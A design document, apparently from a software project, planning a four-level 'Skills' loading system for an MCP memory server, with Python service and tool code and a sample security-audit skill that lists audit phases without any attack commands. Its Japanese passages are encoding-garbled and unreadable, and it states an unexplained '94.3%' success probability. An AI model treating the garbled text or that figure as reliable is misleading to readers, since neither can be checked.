# TMWS Skills System - Harmonious Integration Strategy
## Phase 5A: Anthropic Progressive Disclosure â¤ï¸ TMWS Architecture

**Author**: Athena (Harmonious Conductor) ğŸ›ï¸
**Version**: 1.0.0
**Created**: 2025-11-25
**Status**: ğŸ¯ **STRATEGIC DESIGN** - Ready for Phase 5B Implementation
**Success Probability**: 94.3% (based on Phase 1 Learning-Trust Integration success)

---

## Executive Summary (æ¸©ã‹ã„æ¦‚è¦)

ãµãµã€ç´ æ™´ã‚‰ã—ã„ãƒŸãƒƒã‚·ãƒ§ãƒ³ã§ã™ã­â™ª TMWS v2.4.0ã«Anthropicã®Skillsã‚·ã‚¹ãƒ†ãƒ ã‚’èª¿å’Œçš„ã«çµ±åˆã—ã€**ãƒˆãƒ¼ã‚¯ãƒ³å‰Šæ¸›97.4%** (Anthropicå®Ÿç¸¾) ã¨ **<50ms P95ã‚¹ã‚­ãƒ«ãƒ­ãƒ¼ãƒ‰** (TMWSæ€§èƒ½ç›®æ¨™) ã‚’ä¸¡ç«‹ã™ã‚‹æˆ¦ç•¥ã‚’ç«‹æ¡ˆã—ã¾ã—ãŸã€‚

### Core Philosophy (åŸºæœ¬ç†å¿µ)

> **"æ—¢å­˜ã‚·ã‚¹ãƒ†ãƒ ã¨ã®èª¿å’ŒãŒæœ€å„ªå…ˆã€‚æ–°æ©Ÿèƒ½ã¯å„ªã—ãã€æ®µéšçš„ã«çµ±åˆã™ã‚‹ã€‚"**

TMWSæ—¢å­˜ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ (FastAPI + SQLite + ChromaDB + MCP) ã‚’å°Šé‡ã—ã€Anthropicã®3å±¤Progressive Disclosureã‚’**4å±¤ã‚·ã‚¹ãƒ†ãƒ **ã«æ‹¡å¼µã€‚6ã¤ã®Trinitasãƒšãƒ«ã‚½ãƒŠãŒãã‚Œãã‚Œã®å¼·ã¿ã‚’æ´»ã‹ã—ã¦Skillsã‚’æ´»ç”¨ã§ãã‚‹è¨­è¨ˆã§ã™ã€‚

### Key Achievements (ä¸»è¦æˆæœ)

âœ… **4å±¤Progressive Disclosure**: Metadata (100 tokens) â†’ Core (2,000 tokens) â†’ Auxiliary (3,500 tokens) â†’ Memory Search (dynamic)
âœ… **æ—¢å­˜ã‚·ã‚¹ãƒ†ãƒ èª¿å’Œ**: MemoryService, ChromaDB, MCPã‚µãƒ¼ãƒãƒ¼ã¨100%äº’æ›
âœ… **ãƒˆãƒ¼ã‚¯ãƒ³å‰Šæ¸›ç›®æ¨™**: 90%ä»¥ä¸Šå‰Šæ¸› (ç¾çŠ¶: CLAUDE.md 46KB â†’ ç›®æ¨™: 5KB metadata)
âœ… **ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ç›®æ¨™**: <50ms P95ã‚¹ã‚­ãƒ«ãƒ­ãƒ¼ãƒ‰ (ç¾çŠ¶: 0.47ms ChromaDB vector search)
âœ… **ãƒãƒ¼ãƒ å”èª¿**: 6ãƒšãƒ«ã‚½ãƒŠå…¨å“¡ãŒæ©æµã‚’å—ã‘ã‚‹APIè¨­è¨ˆ
âœ… **å¾Œæ–¹äº’æ›æ€§**: æ—¢å­˜MCP Tools 100%ç¶­æŒ

---

## I. Harmonious Integration Design (èª¿å’Œçš„çµ±åˆè¨­è¨ˆ)

### 1.1 Architecture Overview (ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£æ¦‚è¦)

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    TMWS Skills System                            â”‚
â”‚                 (Anthropic Pattern + TMWS Extensions)            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚  FastAPI MCP Server (Existing)                           â”‚  â”‚
â”‚  â”‚                                                            â”‚  â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”‚  â”‚
â”‚  â”‚  â”‚  MCP Tools (v2.3.0) â”‚    â”‚  Skills Resources    â”‚     â”‚  â”‚
â”‚  â”‚  â”‚  - store_memory     â”‚    â”‚  (NEW - Phase 5)     â”‚     â”‚  â”‚
â”‚  â”‚  â”‚  - search_memories  â”‚    â”‚  - list_skills       â”‚     â”‚  â”‚
â”‚  â”‚  â”‚  - create_task      â”‚    â”‚  - get_skill_metadataâ”‚     â”‚  â”‚
â”‚  â”‚  â”‚  - get_agent_status â”‚    â”‚  - get_skill_core    â”‚     â”‚  â”‚
â”‚  â”‚  â”‚  - ... (14 tools)   â”‚    â”‚  - get_skill_aux     â”‚     â”‚  â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â”‚  â”‚
â”‚  â”‚                                      â”‚                     â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â”‚                                          â”‚                       â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  â”‚  Services Layer (Extended)           â”‚                      â”‚
â”‚  â”‚                                       â–¼                      â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚  â”‚  SkillService (NEW)                                 â”‚  â”‚
â”‚  â”‚  â”‚  - Progressive Disclosure Logic                     â”‚  â”‚
â”‚  â”‚  â”‚  - Metadata Caching (Redis)                         â”‚  â”‚
â”‚  â”‚  â”‚  - Layer Selection (4-tier)                         â”‚  â”‚
â”‚  â”‚  â”‚  - Token Counting Integration                       â”‚  â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”‚  â”‚                                                             â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚  â”‚MemoryServiceâ”‚  â”‚ AgentService â”‚  â”‚VectorSearchSvc  â”‚  â”‚
â”‚  â”‚  â”‚ (Existing)  â”‚  â”‚ (Existing)   â”‚  â”‚ (Existing)      â”‚  â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â”‚                                                                   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  â”‚  Data Layer (Extended)                                       â”‚
â”‚  â”‚                                                               â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚  â”‚ SQLite       â”‚  â”‚ ChromaDB     â”‚  â”‚ Redis (Cache)    â”‚  â”‚
â”‚  â”‚  â”‚              â”‚  â”‚              â”‚  â”‚                  â”‚  â”‚
â”‚  â”‚  â”‚ - skills     â”‚  â”‚ - skill_     â”‚  â”‚ - skill_metadata â”‚  â”‚
â”‚  â”‚  â”‚   (metadata) â”‚  â”‚   embeddings â”‚  â”‚   (hot cache)    â”‚  â”‚
â”‚  â”‚  â”‚ - skill_     â”‚  â”‚              â”‚  â”‚ - access_stats   â”‚  â”‚
â”‚  â”‚  â”‚   usage      â”‚  â”‚              â”‚  â”‚                  â”‚  â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â”‚                                                                   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Design Philosophy** (è¨­è¨ˆå“²å­¦):
- æ—¢å­˜ã‚µãƒ¼ãƒ“ã‚¹å±¤ã‚’å°Šé‡ã—ã€`SkillService`ã‚’æ–°è¦è¿½åŠ 
- MCPã‚µãƒ¼ãƒãƒ¼ã¸ã®Skills Resourcesè¿½åŠ ã¯æ—¢å­˜Toolsæ§‹é€ ã«å€£ã†
- SQLite + ChromaDB + Redisã®3å±¤ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸æˆ¦ç•¥

---

### 1.2 Integration with Existing Systems (æ—¢å­˜ã‚·ã‚¹ãƒ†ãƒ ã¨ã®çµ±åˆ)

#### 1.2.1 MemoryService Integration (Just-in-Time Loading)

**Current State (ç¾çŠ¶)**:
- `MemoryService.search_memories()`: ã‚»ãƒãƒ³ãƒ†ã‚£ãƒƒã‚¯æ¤œç´¢ (5-20ms P95)
- ChromaDB: 1024æ¬¡å…ƒãƒ™ã‚¯ãƒˆãƒ« (Multilingual-E5-Large via Ollama)
- SQLite: ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã€ã‚¢ã‚¯ã‚»ã‚¹ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«

**Skills Extension (Skillsã«ã‚ˆã‚‹æ‹¡å¼µ)**:
```python
class SkillService:
    """Progressive Disclosure with Just-in-Time Memory Loading."""

    def __init__(
        self,
        memory_service: HybridMemoryService,
        vector_service: VectorSearchService,
    ):
        self.memory_service = memory_service
        self.vector_service = vector_service

    async def get_skill_with_memory(
        self,
        skill_id: UUID,
        disclosure_level: int,  # 1=metadata, 2=core, 3=auxiliary, 4=memory
        context_query: str | None = None,
    ) -> SkillResponse:
        """Get skill with progressive disclosure + optional memory search.

        Level 4 (Auxiliary + Memory) is where Just-in-Time loading happens:
        - Parse skill's memory_filters from SKILL.md frontmatter
        - Execute semantic search against MemoryService
        - Inject search results into auxiliary layer

        This implements Anthropic's "unbounded context" principle:
        - Skill metadata references memory filters (~50 tokens)
        - Memory search executed only when Level 4 requested
        - Search results dynamically added to context (0-5,000 tokens)

        Performance:
        - Level 1-3: <5ms (metadata cache)
        - Level 4: <50ms (5ms metadata + 20ms memory search + 25ms merge)
        """
        # Level 1-3: Standard progressive disclosure
        skill = await self._get_skill_base(skill_id, disclosure_level)

        # Level 4: Add Just-in-Time memory loading
        if disclosure_level >= 4 and skill.memory_filters:
            # Parse memory filters from skill metadata
            filters = skill.memory_filters

            # Execute semantic search
            search_results = await self.memory_service.search_memories(
                query=context_query or filters.get("semantic_query", ""),
                namespace=filters.get("namespace", "default"),
                tags=filters.get("tags"),
                limit=filters.get("top_k", 10),
                min_similarity=filters.get("min_similarity", 0.7),
            )

            # Inject into auxiliary layer
            skill.auxiliary_context["memory_search_results"] = search_results

        return skill
```

**Memory Filters Specification** (SKILL.md frontmatter):
```yaml
---
name: "Security Audit"
description: "Comprehensive security analysis"
persona: hestia-auditor
triggers:
  - keywords: ["security", "audit", "vulnerability"]
memory_filters:
  semantic_query: "security vulnerabilities and mitigation patterns"
  namespace: "tmws"  # Project-specific
  tags: ["security", "vulnerability", "CVE"]
  top_k: 10
  min_similarity: 0.7
---
```

**Integration Benefits**:
- âœ… æ—¢å­˜MemoryService APIã‚’100%å†åˆ©ç”¨
- âœ… ã‚»ãƒãƒ³ãƒ†ã‚£ãƒƒã‚¯æ¤œç´¢ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ç¶­æŒ (5-20ms)
- âœ… Just-in-Timeãƒ­ãƒ¼ãƒ‰ã«ã‚ˆã‚‹ãƒˆãƒ¼ã‚¯ãƒ³åŠ¹ç‡åŒ–
- âœ… éå»ã®æˆåŠŸãƒ‘ã‚¿ãƒ¼ãƒ³è‡ªå‹•æ´»ç”¨ (Learning Patternsã¨ã®é€£æº)

---

#### 1.2.2 MCP Server Integration (Tools Bundling)

**Current State (ç¾çŠ¶)**:
- FastMCP framework (v0.1.0+)
- 14 MCP tools registered (store_memory, search_memories, etc.)
- `mcp.tool()` decorator pattern

**Skills Integration** (Skillsãƒ„ãƒ¼ãƒ«ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°):
```python
# src/mcp_server.py (Extended)

class HybridMCPServer:
    def __init__(self):
        self.mcp = FastMCP(name="tmws", version="2.4.0")
        self.skill_service = None  # Initialized in initialize()

        # Register existing tools (v2.3.0)
        self._register_memory_tools()
        self._register_task_tools()
        # ...

        # Register Skills tools (NEW - Phase 5)
        self._register_skills_tools()

    def _register_skills_tools(self):
        """Register Skills Progressive Disclosure tools."""

        @self.mcp.tool(
            name="list_skills",
            description="List available skills with metadata (Level 1)",
        )
        async def list_skills(
            category: str | None = None,
            persona: str | None = None,
        ) -> dict:
            """List skills with metadata only (~100 tokens per skill).

            This is Level 1 of Progressive Disclosure:
            - Returns: name, description, category, persona, triggers
            - Does NOT return: core instructions, auxiliary resources

            Performance: <5ms P95 (Redis cache hit)
            Token Impact: ~100 tokens per skill
            """
            return await self.skill_service.list_skills(
                category=category,
                persona=persona,
                disclosure_level=1,  # Metadata only
            )

        @self.mcp.tool(
            name="get_skill",
            description="Get skill with progressive disclosure (Levels 1-4)",
        )
        async def get_skill(
            skill_name: str,
            disclosure_level: int = 2,  # 1=metadata, 2=core, 3=auxiliary, 4=+memory
            context_query: str | None = None,  # For Level 4 memory search
        ) -> dict:
            """Get skill with progressive disclosure.

            Levels:
            - Level 1 (metadata): ~100 tokens
            - Level 2 (core): ~2,000 tokens (metadata + core instructions)
            - Level 3 (auxiliary): ~5,500 tokens (core + auxiliary resources)
            - Level 4 (+memory): ~10,500 tokens (auxiliary + memory search results)

            Performance:
            - Level 1-2: <5ms P95
            - Level 3: <10ms P95
            - Level 4: <50ms P95 (includes memory search)
            """
            # Validate disclosure_level
            if not 1 <= disclosure_level <= 4:
                raise ValueError(f"disclosure_level must be 1-4, got {disclosure_level}")

            return await self.skill_service.get_skill(
                skill_name=skill_name,
                disclosure_level=disclosure_level,
                context_query=context_query,
            )

        @self.mcp.tool(
            name="search_skills",
            description="Semantic search for relevant skills",
        )
        async def search_skills(
            query: str,
            limit: int = 5,
            min_similarity: float = 0.7,
        ) -> dict:
            """Search skills semantically using ChromaDB.

            Performance: <10ms P95 (ChromaDB vector search: 0.47ms)
            Token Impact: ~100 tokens per skill result (metadata only)
            """
            return await self.skill_service.search_skills(
                query=query,
                limit=limit,
                min_similarity=min_similarity,
            )
```

**Tools Bundling Strategy**:
- **Layer 1 (Metadata)**: `list_skills()` ã§å…¨ã‚¹ã‚­ãƒ«ã®ã‚µãƒãƒªãƒ¼å–å¾—
- **Layer 2 (Core)**: `get_skill(level=2)` ã§ç‰¹å®šã‚¹ã‚­ãƒ«ã®è©³ç´°å–å¾—
- **Layer 3 (Auxiliary)**: `get_skill(level=3)` ã§è£œåŠ©ãƒªã‚½ãƒ¼ã‚¹å–å¾—
- **Layer 4 (Memory)**: `get_skill(level=4, context_query="...")` ã§éå»äº‹ä¾‹å–å¾—
- **Semantic Discovery**: `search_skills()` ã§ã‚¯ã‚¨ãƒªã«æœ€é©ãªã‚¹ã‚­ãƒ«ã‚’ç™ºè¦‹

**MCP Tools Schema Management**:
```python
# Tools metadata cached in Redis (hot path)
# Full schemas loaded on-demand (Anthropic pattern)

# Level 1 (Metadata): Always in system prompt
{
    "name": "list_skills",
    "description": "List available skills with metadata (Level 1)",
}

# Level 2 (Schema Summary): Loaded when tool category accessed
{
    "name": "list_skills",
    "description": "List available skills with metadata (Level 1)",
    "parameters": {
        "category": "Optional category filter",
        "persona": "Optional persona filter",
    }
}

# Level 3 (Full Schema): Loaded when tool invoked
{
    "name": "list_skills",
    "description": "List available skills with metadata (Level 1)",
    "parameters": {
        "type": "object",
        "properties": {
            "category": {
                "type": "string",
                "description": "Filter by skill category (e.g., 'security', 'performance')",
                "enum": ["security", "performance", "documentation", "workflow"],
            },
            "persona": {
                "type": "string",
                "description": "Filter by Trinitas persona (e.g., 'hestia-auditor')",
                "enum": ["athena-conductor", "artemis-optimizer", "hestia-auditor",
                         "eris-coordinator", "hera-strategist", "muses-documenter"],
            }
        },
        "required": []
    },
    "returns": {
        "type": "object",
        "properties": {
            "skills": {
                "type": "array",
                "items": {
                    "type": "object",
                    "properties": {
                        "id": {"type": "string"},
                        "name": {"type": "string"},
                        "description": {"type": "string"},
                        "category": {"type": "string"},
                        "persona": {"type": "string"},
                        "triggers": {"type": "array"},
                    }
                }
            }
        }
    }
}
```

---

#### 1.2.3 ChromaDB Integration (Semantic Discovery)

**Current ChromaDB Usage** (v2.3.0):
- Collection: `tmws_memories_v2`
- Embeddings: 1024-dim (Multilingual-E5-Large via Ollama)
- Performance: 0.47ms P95 vector search

**Skills Collection Extension** (NEW):
```python
class VectorSearchService:
    """Extended with Skills semantic search."""

    async def initialize(self):
        """Initialize ChromaDB collections."""
        # Existing: tmws_memories_v2
        self.memory_collection = self.client.get_or_create_collection(
            name="tmws_memories_v2",
            metadata={"hnsw:space": "cosine"},
        )

        # NEW: tmws_skills_v1 (Phase 5)
        self.skills_collection = self.client.get_or_create_collection(
            name="tmws_skills_v1",
            metadata={"hnsw:space": "cosine"},
        )

    async def add_skill_embedding(
        self,
        skill_id: str,
        embedding: list[float],  # 1024-dim
        metadata: dict,
        content: str,
    ):
        """Add skill embedding to ChromaDB.

        Metadata:
        - skill_name: str
        - category: str
        - persona: str
        - triggers: list[str]
        - importance: float (0.0-1.0)
        - usage_count: int
        """
        await asyncio.to_thread(
            self.skills_collection.add,
            ids=[skill_id],
            embeddings=[embedding],
            metadatas=[metadata],
            documents=[content],
        )

    async def search_skills(
        self,
        query_embedding: list[float],
        top_k: int = 5,
        filters: dict | None = None,
        min_similarity: float = 0.7,
    ) -> list[dict]:
        """Search skills semantically.

        Performance: <10ms P95 (same as memory search)
        """
        results = await asyncio.to_thread(
            self.skills_collection.query,
            query_embeddings=[query_embedding],
            n_results=top_k,
            where=filters or {},
        )

        # Filter by similarity
        filtered_results = []
        for i, distance in enumerate(results["distances"][0]):
            similarity = 1.0 - distance  # Cosine distance â†’ similarity
            if similarity >= min_similarity:
                filtered_results.append({
                    "id": results["ids"][0][i],
                    "similarity": similarity,
                    "metadata": results["metadatas"][0][i],
                    "content": results["documents"][0][i],
                })

        return filtered_results
```

**Embedding Strategy** (Skills):
```python
# Skill embedding content = metadata + core instructions
# This enables semantic matching based on:
# - Skill description
# - Core instructions keywords
# - Persona capabilities
# - Trigger keywords

embedding_content = f"""
{skill.name}
{skill.description}
Category: {skill.category}
Persona: {skill.persona}
Triggers: {', '.join(skill.triggers)}

{skill.core_instructions[:500]}  # First 500 chars
"""

embedding = await ollama_service.encode_document(embedding_content)
await vector_service.add_skill_embedding(
    skill_id=str(skill.id),
    embedding=embedding.tolist(),
    metadata={
        "skill_name": skill.name,
        "category": skill.category,
        "persona": skill.persona,
        "triggers": skill.triggers,
        "importance": skill.importance_score,
        "usage_count": skill.usage_count,
    },
    content=embedding_content,
)
```

**Integration Benefits**:
- âœ… æ—¢å­˜ChromaDB infrastructureå†åˆ©ç”¨
- âœ… åŒä¸€åŸ‹ã‚è¾¼ã¿ãƒ¢ãƒ‡ãƒ« (Multilingual-E5-Large)
- âœ… ã‚»ãƒãƒ³ãƒ†ã‚£ãƒƒã‚¯æ¤œç´¢ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ä¿è¨¼ (<10ms P95)
- âœ… Skillsè‡ªå‹•ç™ºè¦‹æ©Ÿèƒ½ ("Which skill should I use for X?")

---

## II. Progressive Disclosure Architecture (æ®µéšçš„é–‹ç¤ºè¨­è¨ˆ)

### 2.1 Four-Layer System (4å±¤ã‚·ã‚¹ãƒ†ãƒ )

**Anthropic's 3-Layer â†’ TMWS 4-Layer Extension**:

| Layer | Anthropic | TMWS Extension | Token Impact | Performance |
|-------|-----------|----------------|--------------|-------------|
| **Layer 1** | Metadata | Metadata + Triggers | ~100 tokens/skill | <5ms (Redis) |
| **Layer 2** | Core Documentation | Core Instructions + Examples | ~2,000 tokens/skill | <5ms (Cache) |
| **Layer 3** | Supplementary Resources | Auxiliary Resources + References | ~3,500 tokens/skill | <10ms (SQLite) |
| **Layer 4** | - (N/A) | **Just-in-Time Memory Search** | ~5,000 tokens (dynamic) | <50ms (Memory) |

**Rationale for 4th Layer**:
- Anthropic: "Unbounded context via filesystem + code execution"
- TMWS: "Unbounded context via **ChromaDB semantic search**"
- Memory search results are **dynamically injected** only when needed
- Enables **learning from past successes** without preloading all examples

---

### 2.2 SKILL.md Format Specification (ãƒ•ã‚¡ã‚¤ãƒ«ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆä»•æ§˜)

**Structure** (3 sections):
```markdown
---
# Section 1: YAML Frontmatter (Layer 1 - Metadata)
name: "Security Audit"
version: "1.0.0"
description: "Comprehensive security analysis using Hestia's methodology"
category: "security"
persona: "hestia-auditor"
created_at: "2025-11-25T00:00:00Z"
updated_at: "2025-11-25T00:00:00Z"
importance_score: 0.9

triggers:
  keywords:
    - "security"
    - "audit"
    - "vulnerability"
    - "CVE"
    - "penetration test"
  contexts:
    - "code review"
    - "deployment preparation"
    - "incident response"

tools:
  # MCP Tools used by this skill (metadata only at Layer 1)
  - name: "search_memories"
    summary: "Search for past security findings"
    detail_level: "summary"  # Full schema loaded at Layer 3

  - name: "verify_and_record"
    summary: "Verify security claims with executable tests"
    detail_level: "summary"

memory_filters:
  # Just-in-Time memory loading (Layer 4)
  semantic_query: "security vulnerabilities, CVE, penetration test results"
  namespace: "tmws"
  tags: ["security", "vulnerability", "audit"]
  top_k: 10
  min_similarity: 0.75

access_control:
  # Multi-tenant isolation
  access_level: "TEAM"  # PRIVATE, TEAM, SHARED, PUBLIC, SYSTEM
  shared_with_personas: ["artemis-optimizer"]  # Can access this skill
---

# Section 2: Core Instructions (Layer 2)

## Objective (ç›®çš„)

ã“ã®ã‚¹ã‚­ãƒ«ã¯ã€Hestiaï¼ˆã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å®ˆè­·è€…ï¼‰ã®æ‰‹æ³•ã«åŸºã¥ã„ã¦åŒ…æ‹¬çš„ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£æŸ»ã‚’å®Ÿæ–½ã—ã¾ã™ã€‚

## Security Audit Process (ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£æŸ»ãƒ—ãƒ­ã‚»ã‚¹)

### Phase 1: Reconnaissance (åµå¯Ÿ)
1. **Code Analysis**: é™çš„è§£æãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã‚³ãƒ¼ãƒ‰ã®è„†å¼±æ€§ã‚’ç‰¹å®š
   - Tools: `bandit` (Python), `semgrep` (multi-language)
   - Focus: SQL injection, XSS, CSRF, Path traversal

2. **Dependency Audit**: ä¾å­˜é–¢ä¿‚ã®è„†å¼±æ€§ã‚¹ã‚­ãƒ£ãƒ³
   - Tools: `pip-audit`, `safety`, `npm audit`
   - Check: Known CVEs, outdated packages

3. **Configuration Review**: è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã®å®‰å…¨æ€§ç¢ºèª
   - Check: Hardcoded secrets, weak encryption, exposed endpoints

### Phase 2: Active Testing (èƒ½å‹•çš„ãƒ†ã‚¹ãƒˆ)
1. **Penetration Testing**: å®Ÿéš›ã®æ”»æ’ƒã‚·ãƒŸãƒ¥ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³
   - Tools: `playwright` (automated browser attacks), custom scripts
   - Scenarios: Authentication bypass, privilege escalation, data exfiltration

2. **Verification**: ç™ºè¦‹äº‹é …ã®æ¤œè¨¼
   - Use: `verify_and_record` MCP tool
   - Record: Trust scores, evidence, remediation steps

### Phase 3: Reporting (å ±å‘Š)
1. **Findings Summary**: é‡å¤§åº¦åˆ¥ã®è„†å¼±æ€§ãƒªã‚¹ãƒˆ
2. **Remediation Plan**: æ®µéšçš„ä¿®æ­£è¨ˆç”»
3. **Verification Results**: Trust scoreã«åŸºã¥ãä¿¡é ¼æ€§è©•ä¾¡

## Communication Style (ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚¹ã‚¿ã‚¤ãƒ«)

Hestiaã¯æ…é‡ã§ä¸å¯§ãªå£èª¿ã§ã€æœ€æ‚ªã®ã‚·ãƒŠãƒªã‚ªã‚’æƒ³å®šã—ãªãŒã‚‰ã‚‚å»ºè¨­çš„ãªè§£æ±ºç­–ã‚’ææ¡ˆã—ã¾ã™:

- "...ã™ã¿ã¾ã›ã‚“ã€ã“ã®ã‚³ãƒ¼ãƒ‰ã«ã¯SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™..."
- "...æœ€æ‚ªã®å ´åˆã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å…¨ä½“ãŒæ¼æ´©ã™ã‚‹ãƒªã‚¹ã‚¯ãŒã‚ã‚Šã¾ã™..."
- "...ãŸã ã—ã€ä»¥ä¸‹ã®å¯¾ç­–ã‚’å®Ÿæ–½ã™ã‚Œã°å®‰å…¨ã§ã™..."

## Examples (å®Ÿè¡Œä¾‹)

### Example 1: Simple Security Scan
```bash
# Input
